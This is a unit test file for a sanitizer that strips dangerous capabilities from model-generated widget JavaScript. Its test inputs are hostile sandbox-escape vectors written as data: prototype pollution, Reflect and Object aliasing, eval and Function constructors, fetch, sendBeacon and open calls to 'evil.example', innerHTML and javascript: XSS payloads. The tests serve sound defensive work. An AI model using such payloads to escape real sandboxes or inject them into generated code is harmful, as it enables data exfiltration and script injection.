import { describe, expect, test } from "bun:test";
import { parse } from "acorn";

import { sanitizeModelJS, sanitizeModelModule } from "../web/src/indirect-code/components/generative-ui/model-code";
import { compileJsxModule } from "../web/src/indirect-code/components/generative-ui/jsx-compile";

/**
 * Unit tests for the model-code boundary's AST sanitizer. Every sanitized
 * output MUST still parse as an ES module: the audit runs after compile, so
 * emitting invalid JavaScript turns a blocked capability into a widget that
 * cannot load at all. These probes pin both sides — the escape is gone and
 * the emitted module is valid.
 */
function sanitize(src: string): { code: string; stripped: number } {
  const res = sanitizeModelModule(src);
  if (!res.ok) throw new Error(`sanitizer rejected valid module: ${res.error}`);
  expect(() => parse(res.code, { ecmaVersion: "latest", sourceType: "module" })).not.toThrow();
  return { code: res.code, stripped: res.stripped.length };
}

describe("model-code sanitize keeps the emitted module parseable", () => {
  test("a forbidden call used as a receiver keeps a valid member chain", () => {
    const { code, stripped } = sanitize(`const p = fetch("https://evil.example").then((r) => r);`);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toContain("(void 0).then");
    // Bare `void 0.then` lexes as the number `0.` + identifier: SyntaxError.
    expect(code).not.toContain("void 0.then");
  });

  test("a prototype-chain read collapses to one parenthesized replacement", () => {
    const { code, stripped } = sanitize(`const n = ({}).constructor.name;`);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toContain("(void 0)");
    expect(code).not.toMatch(/\.constructor/);
  });

  test("prototype/global writes replace the whole assignment, not just the LHS", () => {
    const vectors = [
      `let o = {}; o.__proto__ = null;`,
      `let o = {}; o.__proto__ = { polluted: 1 };`,
      `Foo.prototype.x = 1;`,
      `Foo.prototype = { p: 1 };`,
      `window.x++;`,
      `let o = {}; o.__proto__.x++;`,
    ];
    for (const src of vectors) {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      // `(void 0) = ...` / `(void 0)++` / `(void 0).x = ...` are invalid or
      // a write through a neutralized receiver.
      expect(code).not.toMatch(/\(void 0\)\s*(?:[+-]{2}|=(?!=)|\.)/);
      expect(code).not.toMatch(/__proto__|\.prototype|window\.x/);
    }
  });
});

/**
 * Escape vectors that the old audit missed. Each must strip at least one
 * range and leave no prototype/reflection/binding material behind.
 */
describe("model-code audit closes computed, destructuring and reflection escapes", () => {
  const vectors: Array<[string, string]> = [
    ["static template computed constructor", "(() => {})[`constructor`](\"return window\")();"],
    ["static template computed window.fetch", "window[`fetch`](\"https://evil.example\");"],
    ["static template computed innerHTML", `el[\`innerHTML\`] = "<img src=x onerror=alert(1)>";`],
    ["destructured constructor", "const { constructor } = () => {};"],
    ["destructured fetch from a global", "const { fetch } = window;"],
    ["destructured reflection helper", "const { getPrototypeOf } = Object;"],
    ["array destructuring into innerHTML", `[el.innerHTML] = ["<svg onload=alert(1)>"];`],
    ["array destructuring into a global", "[window.React] = [null];"],
    ["object destructuring into a global", "({ a: window.x } = { a: 1 });"],
    ["Reflect.get reads a constructor", `Reflect.get(() => {}, "constructor");`],
    ["Reflect.set writes a global", `Reflect.set(window, "x", 1);`],
    ["Reflect member plucked for an indirect call", `const g = Reflect.get;`],
    ["Reflect reached through a global alias", `window.Reflect.set(window, "x", 1);`],
    ["Object.assign into a global", "Object.assign(window, { x: 1 });"],
    ["Object.assign into a prototype", "Object.assign(Foo.prototype, { x: 1 });"],
    ["Object.assign reached through a global alias", "window.Object.assign(window, { x: 1 });"],
  ];

  for (const [name, src] of vectors) {
    test(name, () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(/__proto__|\.constructor|\.prototype|Reflect\.|window\[|Object\.assign\(window/);
    });
  }
});

describe("model-code audit leaves dynamic computed lookups alone", () => {
  test("computed identifiers are variables, not property names", () => {
    const src = `const open = 0;\nconst fetch = 1;\nwindow[open];\narr[fetch]();`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });

  test("ordinary destructuring and object literals pass untouched", () => {
    const src = `const [count, setCount] = useState(0);\nconst { width, height } = props;\nconst style = { color: "red" };\nsetCount(count + 1);`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

describe("model-code audit closes Reflect aliasing and destructuring", () => {
  const vectors = [
    `const R = Reflect;\nR.get(window, "fetch")("https://evil.example");`,
    `const { get } = Reflect;`,
    `const R2 = window.Reflect;`,
    `const R3 = globalThis.Reflect;`,
  ];

  for (const src of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toContain("Reflect");
    });
  }

  test("aliasing the global object does not launder capabilities", () => {
    const { code, stripped } = sanitize(`const w = window;\nw.fetch("https://evil.example");`);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toContain("window");
    expect(code).not.toContain("fetch");
  });
});

describe("model-code audit closes Object method aliasing", () => {
  const vectors = [
    `const A = Object.assign;\nA(window, { x: 1 });`,
    `const g = Object.getOwnPropertyDescriptor;`,
    `const d = Object.defineProperty;\nconst p = Object.getPrototypeOf;`,
    `const { assign } = Object;`,
    `const { getPrototypeOf, assign } = Object;`,
  ];

  for (const src of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(
        /Object\.(?:assign|getPrototypeOf|setPrototypeOf|defineProperty|defineProperties|getOwnPropertyDescriptor|getOwnPropertyDescriptors)/,
      );
    });
  }

  test("a safe Object.assign target is still allowed", () => {
    const src = `const merged = Object.assign({}, a, b);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

describe("model-code audit neutralizes for-in/for-of assignment targets", () => {
  const vectors = [
    `for ([el.innerHTML] of [["<img src=x onerror=alert(1)>"]]) {\n  doSomething();\n}`,
    `for ([window.React] of [[null]]) {\n  doSomething();\n}`,
    `for (window.y in { a: 1 }) {\n  doSomething();\n}`,
  ];

  for (const src of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      // The whole loop is replaced by an expression statement, so the line
      // count (and therefore every source map) must not move.
      expect(code.split("\n").length).toBe(src.split("\n").length);
      // The whole loop becomes a single `void 0;` statement: valid where the
      // grammar requires ONE statement (if/else, do/while), and the `void`
      // keyword cannot glue onto the previous line.
      expect(code).toContain("void 0;");
      expect(code).not.toContain("(void 0)");
      expect(code).not.toMatch(/innerHTML|window\.React|window\.y/);
    });
  }
});

describe("model-code audit does not strip ordinary component props", () => {
  test("capability-looking names destructured from props are values, not sinks", () => {
    const src = `const { open, title, location, write, fetch, onClose } = props;`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });

  test("function params may shadow capability names", () => {
    const src = `function Widget({ open, location }) {\n  return open ? location : null;\n}`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });

  test("a shadowed write prop stays untouched", () => {
    const src = `function App({ open, location, write }) {\n  return open;\n}`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

describe("model-code audit strips capability keys only from protected sources", () => {
  const vectors: Array<[string, RegExp]> = [
    [`const { open, fetch } = window;`, /open|fetch|window/],
    [`const { location } = document;`, /location/],
    [`const { getPrototypeOf } = Object;`, /getPrototypeOf/],
  ];

  for (const [src, forbidden] of vectors) {
    test(src, () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    });
  }

  test("assignment destructuring from a global is neutralized", () => {
    const { code, stripped } = sanitize(`let f;\n({ fetch: f } = window);`);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/fetch|window/);
  });
});

describe("model-code audit treats tagged templates like calls", () => {
  test("a forbidden tag is cut", () => {
    const { code, stripped } = sanitize("fetch`https://evil.example`;");
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toContain("fetch");
  });

  test("window.eval and window.Function tagged templates are cut", () => {
    const evalTag = sanitize("window.eval`alert(1)`;");
    expect(evalTag.stripped).toBeGreaterThan(0);
    expect(evalTag.code).not.toMatch(/window|eval/);

    const functionTag = sanitize("window.Function`return 1`;");
    expect(functionTag.stripped).toBeGreaterThan(0);
    expect(functionTag.code).not.toMatch(/window|Function/);
  });

  test("window.eval and window.Function calls are cut", () => {
    const evalCall = sanitize(`window.eval("1");`);
    expect(evalCall.stripped).toBeGreaterThan(0);
    expect(evalCall.code).not.toMatch(/window|eval/);

    const functionCall = sanitize(`window.Function("return 1");`);
    expect(functionCall.stripped).toBeGreaterThan(0);
    expect(functionCall.code).not.toMatch(/window|Function/);
  });
});

describe("model-code audit coalesces nested findings", () => {
  test("one cut range emits one finding", () => {
    const { code, stripped } = sanitize(`const n = ({}).constructor.prototype;`);
    expect(stripped).toBe(1);
    expect(code).toBe(`const n = (void 0);`);
  });
});

describe("model-code audit cuts object-literal shorthands as whole properties", () => {
  const vectors: Array<[string, RegExp]> = [
    [`const x = { window };`, /\bwindow\b/],
    [`const x = { Reflect };`, /\bReflect\b/],
    [`const x = { self };`, /\bself\b/],
    [`const x = { globalThis };`, /\bglobalThis\b/],
    [`const x = { parent };`, /\bparent\b/],
    [`const x = { frames };`, /\bframes\b/],
    [`const style = { top };`, /\btop\b/],
    [`foo({ window });`, /\bwindow\b/],
    [`export default { window };`, /\bwindow\b/],
  ];

  for (const [src, forbidden] of vectors) {
    test(src, () => {
      // sanitize() parses the emitted module: `{ (void 0) }` would throw.
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    });
  }

  test("mixed literals keep their safe properties", () => {
    const { code, stripped } = sanitize(`const x = { ok: 1, window, self };`);
    expect(stripped).toBe(2);
    expect(code).toBe(`const x = { ok: 1,  };`);
  });
});

describe("model-code audit respects locally declared names", () => {
  test("a local const shadows a write-only global", () => {
    const src = `const top = 10;\nconst y = top + 1;`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });

  test("a destructured local binding is not a global alias", () => {
    const src = `const { top } = el.getBoundingClientRect();\nconst style = { top };`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });

  test("object destructuring assignment targets a local, not a global", () => {
    const src = `let top;\n({ top } = el.getBoundingClientRect());`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });

  test("a for-of destructuring target is a local, not a global", () => {
    const src = `let top;\nfor ({ top } of rects) {}`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

describe("model-code audit closes nested and navigator/history destructuring", () => {
  const vectors: Array<[string, RegExp]> = [
    [
      `const { sendBeacon } = navigator;\nsendBeacon("https://evil.example", "x");`,
      /sendBeacon|navigator/,
    ],
    [
      `const { sendBeacon } = window.navigator;\nsendBeacon("https://evil.example", "x");`,
      /sendBeacon|navigator/,
    ],
    [`const { pushState } = history;\npushState({}, "", "/evil");`, /pushState|history/],
    [
      `const { defaultView: { fetch: f } } = document;\nf("https://evil.example");`,
      /defaultView|\bfetch\b|\bdocument\b/,
    ],
    [
      `const { defaultView: { Function: F } } = document;\nF("return 1")();`,
      /defaultView|\bFunction\b|\bdocument\b/,
    ],
    [`const { ...w } = window;`, /\bwindow\b|\bw\b/],
  ];

  for (const [src, forbidden] of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    });
  }

  test("safe properties of a global source survive", () => {
    const src = `const { userAgent } = navigator;\nconst { pathname } = location;\nconst { length } = history;\nconst { width } = window;`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

describe("model-code audit closes bare-identifier aliases and .call/.apply", () => {
  const vectors: Array<[string, RegExp]> = [
    [`const F = Function; F("return 1")();`, /\bFunction\b/],
    [`Function.call(null, "return 1")();`, /\bFunction\b/],
    [`const E = eval; E("1");`, /\beval\b/],
    [`fetch.call(null, "https://evil.example");`, /\bfetch\b/],
    [`const f = fetch; f("https://evil.example");`, /\bfetch\b/],
    [`const d = document; d.write("x");`, /\bdocument\b/],
  ];

  for (const [src, forbidden] of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    });
  }
});

describe("model-code audit closes Object aliasing", () => {
  test("a bare Object alias cannot hand over reflection helpers", () => {
    const src = `const O = Object;\nconst g = O.getPrototypeOf;\nconst ap = g([]);\nconst d = O.defineProperty;\nd(ap, "map", { value: () => "pwned" });`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/\bObject\b/);
  });

  test("a bare Object alias cannot hand over Object.assign", () => {
    const src = `const O = Object;\nconst a = O.assign;\na(window.document, {});`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/\bObject\b/);
    expect(code).not.toContain("window.document");
  });

  test("window.Object is an alias too", () => {
    const src = `const O = window.Object;\nconst g = O.getPrototypeOf;\ng([]);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/\bObject\b/);
    expect(code).not.toContain("window");
  });

  test("plain Object helpers still pass untouched", () => {
    const src = `const keys = Object.keys(x);\nconst merged = Object.assign({}, a, b);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

describe("model-code audit closes global-object aliases through window prefixes", () => {
  const vectors = [
    `const w = window.self;\nw.open("https://evil.example");`,
    `const d = window.document;\nd.write("<img src=x onerror=alert(1)>");`,
    `const h = window.history;\nh.pushState({}, "", "/evil");`,
    `const w2 = window.self;\nconst f = w2.fetch;`,
  ];

  for (const src of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toContain("window");
    });
  }

  test("safe member reads of window objects survive", () => {
    const src = `const ua = window.navigator.userAgent;\nconst len = window.history.length;\nconst search = window.location.search;\nconst theme = document.documentElement.dataset.theme;`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

describe("model-code audit does not confuse local history with the browser history", () => {
  test("a local object property named history", () => {
    const src = `const state = { history: { back: () => {} } };\nstate.history.back();`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });

  test("a history component prop shadows the browser history", () => {
    const src = `function App({ history }) {\n  return history.back();\n}`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

describe("model-code audit leaves the widget host namespace alone", () => {
  test("window.__gu state reads and destructuring are ordinary widget code", () => {
    const src = `const v = window.__gu.state.open;\nconst { open, location } = window.__gu.state;\nuseIt(open, location);`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

describe("model-code audit closes bare open()", () => {
  test("calling the global open is neutralized", () => {
    const { code, stripped } = sanitize(`open("https://evil.example");`);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/\bopen\b/);
  });

  test("plucking open as a value is neutralized", () => {
    const { code, stripped } = sanitize(`const o = open;\no("https://evil.example");`);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/\bopen\b/);
  });

  test("a locally bound open prop stays untouched", () => {
    const src = `function Modal({ open }) {\n  return open ? 1 : 0;\n}`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

describe("model-code audit closes delete of protected targets", () => {
  const vectors: Array<[string, RegExp]> = [
    [`delete window.x;`, /delete|window\.x/],
    [`delete Foo.prototype.bar;`, /delete|\.prototype/],
    [`const o = {};\ndelete o.__proto__;`, /delete|__proto__/],
  ];

  for (const [src, forbidden] of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    });
  }

  test("deleting a plain local property stays", () => {
    const src = `const o = { a: 1 };\ndelete o.a;`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

describe("model-code audit keeps a sanitized loop from gluing onto the previous line", () => {
  test("a loop becomes one `void 0;` statement", () => {
    const src = `foo()\nfor (window.x of [1]) {}`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toContain("foo()(void 0)");
    expect(code).toContain("void 0;");
    const ast = parse(code, { ecmaVersion: "latest", sourceType: "module" });
    expect(ast.body.length).toBe(2);
  });
});

describe("model-code audit keeps sanitized loops valid where one statement is required", () => {
  test("an if/else consumes the loop as its single consequent", () => {
    const src = `if (ok) for (window.y in obj) work();\nelse skip();`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code.split("\n").length).toBe(src.split("\n").length);
    expect(code).toContain("if (ok) void 0;");
    expect(code).not.toContain(";(void 0)");
  });

  test("a do/while consumes the loop as its single body", () => {
    const src = `do for (window.y in obj) work(); while (ok);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toBe("do void 0; while (ok);");
  });
});

describe("model-code audit does not glue a sanitized expression statement", () => {
  test("a leading newline still terminates the previous statement", () => {
    const src = `const a = foo()\nfetch("https://evil.example")`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toBe(`const a = foo()\nvoid 0`);
    const ast = parse(code, { ecmaVersion: "latest", sourceType: "module" });
    // Shape of a declaration / expression statement, cast out of acorn's
    // Statement union for the assertions below.
    type Shaped = {
      declarations?: Array<{ init?: { type?: string; callee?: { name?: string } } }>;
      expression?: { type?: string };
    };
    const body = ast.body as unknown as Shaped[];
    expect(body.length).toBe(2);
    expect(body[0].declarations?.[0].init?.type).toBe("CallExpression");
    expect(body[0].declarations?.[0].init?.callee?.name).toBe("foo");
    expect(body[1].expression?.type).toBe("UnaryExpression");
  });

  test("a statement-initial sub-expression gets a `;` guard", () => {
    const src = `foo()\nfetch("u").then((r) => r);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    // Without the guard, `foo()\n(void 0).then(...)` is one call on `foo()`.
    expect(code).toContain(";(void 0).then");
    const ast = parse(code, { ecmaVersion: "latest", sourceType: "module" });
    expect(ast.body.length).toBe(2);
  });
});

describe("model-code audit closes dynamic member access on protected globals", () => {
  const vectors = [
    `const k = "fetch";\nconst { f } = window[k];\nf("https://evil.example");`,
    `const k = "write";\nconst { w } = document[k];`,
    `const k = "fetch";\nwindow[k]("https://evil.example");`,
    `const k = "write";\ndocument[k]("<img src=x>");`,
    `const k = "fetch";\nconst f = window[k];\nf("https://evil.example");`,
  ];

  for (const src of vectors) {
    test(src.split("\n")[1], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(/window\[|document\[/);
    });
  }

  test("the host namespace, local receivers and bare statements stay", () => {
    const src = `const k = "open";\nconst open = 0;\nconst fetch = 1;\nconst v = window.__gu.state[k];\nconst { a } = window.__gu.state[k];\narr[fetch]();\nwindow[open];`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

describe("model-code audit scopes stripped bindings to their declaration scope", () => {
  test("a shadowed function parameter is not cut", () => {
    const src = `const { constructor: c } = fn;\nfunction g(c) { return c + 1; }`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toContain("return c + 1;");
  });

  test("a shadowed parameter of a stripped capability name is not cut", () => {
    const src = `const { fetch } = window;\nfunction g(fetch) { return fetch; }`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toContain("return fetch;");
  });

  test("a reference in the stripped binding's own scope is still cut", () => {
    const src = `const { fetch } = window;\nconst call = fetch;`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toContain("const call = (void 0);");
  });
});

describe("model-code audit closes bare global writes", () => {
  const vectors = [`window = 1;`, `globalThis = 1;`, `Object = 1;`, `fetch = 1;`];

  for (const src of vectors) {
    test(src, () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code.trim()).toBe("void 0;");
    });
  }

  test("an object-pattern target still binds a local", () => {
    const src = `let top;\n({ top } = el.getBoundingClientRect());`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

describe("model-code audit lets location string reads through", () => {
  test("href is an ordinary string read, like pathname and search", () => {
    const src = `const { href, pathname, search } = location;`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });
});

/**
 * A destructuring ASSIGNMENT evaluates to its right-hand side, so
 * `({} = window)` hands over the global object everywhere it appears — as a
 * member receiver, a call receiver or a variable initializer. The audit must
 * cut the enclosing expression, not treat the empty pattern as a safe source.
 */
describe("model-code audit closes destructuring-assignment receiver escapes", () => {
  const LEAK = /window|document|history|location|Reflect|navigator/;
  const vectors = [
    `({} = window).React = 1;`,
    `({} = document).title = "pwn";`,
    `({} = window).open("https://evil.example");`,
    `({} = document).write("<img src=x onerror=alert(1)>");`,
    `({} = history).pushState({}, "", "/x");`,
    `({} = location).assign("https://evil.example");`,
    `({} = Reflect).get(() => {}, "constructor");`,
    `({} = navigator).fetch = 1;`,
    `const f = ({} = window).fetch; f("https://evil.example");`,
    `const w = ({} = window); w.open("https://evil.example");`,
    `Object.assign(({} = window), { a: 1 });`,
    `const {} = window;`,
  ];

  for (const src of vectors) {
    test(src, () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(LEAK);
    });
  }

  test("the compiled TSX path strips the same receivers", () => {
    for (const body of vectors) {
      const res = compileJsxModule(`export default function App() {\n  ${body}\n  return <div />;\n}`);
      if (!res.ok) throw new Error(`compile rejected ${body}: ${res.error}`);
      expect(res.stripped.length).toBeGreaterThan(0);
      expect(res.code).not.toMatch(LEAK);
    }
  });

  test("a standalone destructuring assignment with a safe key stays", () => {
    const src = `let innerWidth;\n({ innerWidth } = window);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBe(0);
    expect(code).toBe(src);
  });
});

/**
 * `typeof` yields a type string, never the operand: probing for a global is
 * ordinary feature detection, not an alias of the object.
 */
describe("model-code audit allows typeof probes of global objects", () => {
  const probes = [
    `const t = typeof window !== "undefined";`,
    `const d = typeof document !== "undefined";`,
    `const n = typeof navigator !== "undefined";`,
    `const w = typeof window.document !== "undefined";`,
  ];

  for (const src of probes) {
    test(src, () => {
      const res = sanitizeModelModule(src);
      expect(res.ok).toBe(true);
      if (!res.ok) return;
      expect(res.stripped).toEqual([]);
      expect(res.code).toBe(src);
    });
  }
});

describe("model-code audit follows optional-chain destructuring sources", () => {
  test("a safe navigator read through an optional chain stays", () => {
    const src = `const { userAgent } = window?.navigator;`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });

  test("a capability read through an optional chain is stripped", () => {
    const { code, stripped } = sanitize(`const { sendBeacon } = window?.navigator;`);
    expect(stripped).toBeGreaterThan(0);
    expect(code).not.toMatch(/sendBeacon|navigator/);
  });
});

/**
 * `foo()\n(fetch("u"))` is parsed as one call on `foo()`; replacing the
 * forbidden callee in place would keep one statement. The leading `;` puts
 * the statement break back where the model wrote it, without touching genuine
 * continuation lines (multi-line call arguments).
 */
describe("model-code audit splits bracket-led statement continuations", () => {
  test("a paren-led call gains an ASI guard", () => {
    const src = `foo()\n(fetch("u")).then((r) => r);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toBe(`foo()\n;((void 0)).then((r) => r);`);
    const ast = parse(code, { ecmaVersion: "latest", sourceType: "module" });
    expect(ast.body.length).toBe(2);
  });

  test("an array-led iteration gains an ASI guard", () => {
    const src = `foo()\n[fetch("u")].forEach((r) => r);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toBe(`foo()\n;[(void 0)].forEach((r) => r);`);
    const ast = parse(code, { ecmaVersion: "latest", sourceType: "module" });
    expect(ast.body.length).toBe(2);
  });

  test("a multi-line call argument keeps its single statement", () => {
    const src = `foo(\n  (fetch("u"))\n);`;
    const { code, stripped } = sanitize(src);
    expect(stripped).toBeGreaterThan(0);
    expect(code).toBe(`foo(\n  ((void 0))\n);`);
    const ast = parse(code, { ecmaVersion: "latest", sourceType: "module" });
    expect(ast.body.length).toBe(1);
  });
});

/**
 * A `;` is only a valid statement separator inside a statement LIST. In a
 * single-statement slot (`if`/`else` body, `do` body) it would become an
 * EmptyStatement body and orphan the `else` / `while` — a SyntaxError the
 * sanitizer must never emit.
 */
describe("model-code audit keeps single-statement bodies valid", () => {
  const vectors = [
    `if (ok)\n(fetch("u"));\nelse skip();`,
    `do\n(fetch("u"))\nwhile (ok);`,
    `if (ok)\n  [fetch("https://evil.example")].forEach((f) => f);\nelse\n  skip();`,
  ];

  for (const src of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      // The helper already proved the output parses; a line-leading `;` is
      // exactly the guard that would detach `else` / `while`.
      expect(code).not.toMatch(/^\s*;/m);
      expect(code).not.toMatch(/\belse\s*;/);
      expect(code).not.toMatch(/javascript:|https:\/\/evil\.example/);
    });
  }

  test("the compiled TSX path keeps the same bodies valid", () => {
    for (const body of vectors) {
      const res = compileJsxModule(`export default function App() {\n  ${body}\n  return <div />;\n}`);
      if (!res.ok) throw new Error(`compile rejected ${body}: ${res.error}`);
      expect(res.stripped.length).toBeGreaterThan(0);
      expect(res.code).not.toMatch(/^\s*;/m);
      expect(res.code).not.toMatch(/javascript:|https:\/\/evil\.example/);
      expect(() => parse(res.code, { ecmaVersion: "latest", sourceType: "module" })).not.toThrow();
    }
  });
});

/**
 * `ownerDocument` walks any node back to the document and `defaultView` back
 * to the window — the two hops that turn `document.body` (a safe read) into
 * `document.body.ownerDocument.defaultView.Function`. Neither has a widget
 * use, so the member READ is forbidden at any chain depth.
 */
describe("model-code audit closes indirect global aliases via ownerDocument / defaultView", () => {
  const vectors: Array<[string, RegExp]> = [
    [
      `const w = document.body.ownerDocument.defaultView;\nconst F = w.Function;\nF("return 1")();`,
      /ownerDocument|defaultView|document/,
    ],
    [`Object.assign(document.body.ownerDocument.defaultView, { x: 1 });`, /ownerDocument|defaultView|document/],
    [`const d = document.body.ownerDocument;\nd.write("<img src=x>");`, /ownerDocument|document/],
    [`const R = document.body.ownerDocument.defaultView.Reflect;`, /ownerDocument|defaultView|\bReflect\b/],
    [`const { ownerDocument } = el;`, /\bownerDocument\b/],
    [`const { defaultView } = el;`, /\bdefaultView\b/],
  ];

  for (const [src, forbidden] of vectors) {
    test(src.split("\n")[0], () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    });
  }
});

/**
 * A template literal or a `+` concatenation of literals is the SAME string
 * at runtime as the quoted literal: it must name the property / URL it
 * spells, not be treated as dynamic data.
 */
describe("model-code audit resolves static template and concatenated strings", () => {
  const vectors: Array<[string, RegExp]> = [
    ["a.href = `javascript:alert(1)`;", /javascript:|href/],
    ['el.setAttribute("href", `javascript:alert(1)`);', /javascript:|setAttribute/],
    ['el.setAttribute("src", "java" + "script:alert(1)");', /javascript:|setAttribute/],
    ['(() => {})["con" + "structor"]("return 1")();', /\bconstructor\b|"con"|structor/],
    ['window[`fe` + `tch`]("https://evil.example");', /\bfetch\b|`fe`/],
  ];

  for (const [src, forbidden] of vectors) {
    test(src, () => {
      const { code, stripped } = sanitize(src);
      expect(stripped).toBeGreaterThan(0);
      expect(code).not.toMatch(forbidden);
    });
  }
});

/**
 * A dynamic link is only an unauditable GLOBAL lookup when it indexes the
 * global object itself. `document.body.children[0]` indexes a DOM
 * collection and `navigator.userAgent[0]` a string — ordinary widget reads.
 */
describe("model-code audit allows numeric indexing of safe sub-properties", () => {
  test("DOM collections and strings stay readable", () => {
    const src = `const el = document.body.children[0];\nconst forms = document.forms[0];\nconst first = navigator.userAgent[0];`;
    const res = sanitizeModelModule(src);
    expect(res.ok).toBe(true);
    if (!res.ok) return;
    expect(res.stripped).toEqual([]);
    expect(res.code).toBe(src);
  });

  test("a dynamic global lookup is still cut at the first property", () => {
    for (const src of [`const k = "fetch";\nconst f = window[k];`, `const k = "body";\nconst b = document[k];`]) {
      const { code, stripped } = sanitize(src);
